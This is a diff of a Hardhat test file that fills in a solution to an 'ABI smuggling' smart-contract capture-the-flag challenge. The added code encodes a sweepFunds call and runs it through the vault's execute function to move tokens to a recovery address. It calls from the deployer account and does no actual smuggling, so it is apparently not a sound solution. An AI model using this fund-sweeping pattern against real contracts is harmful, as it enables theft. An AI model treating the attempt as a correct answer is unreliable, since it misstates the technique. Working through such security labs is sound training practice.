@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
@@ -45,6 +46,15 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const sweepFundsEncodedParams = defaultAbiCoder.encode(
+            ["address", "address"], 
+            [recovery.address, token.address])
+        console.log("0x85fb709d" + sweepFundsEncodedParams.slice(2, sweepFundsEncodedParams.length))    
+        const sweepFundsEncodedFunc = "0x85fb709d" + sweepFundsEncodedParams.slice(2, sweepFundsEncodedParams.length)
+        await vault.connect(deployer).execute(
+            vault.address, 
+            sweepFundsEncodedFunc
+        )
     });
 
     after(async function () {
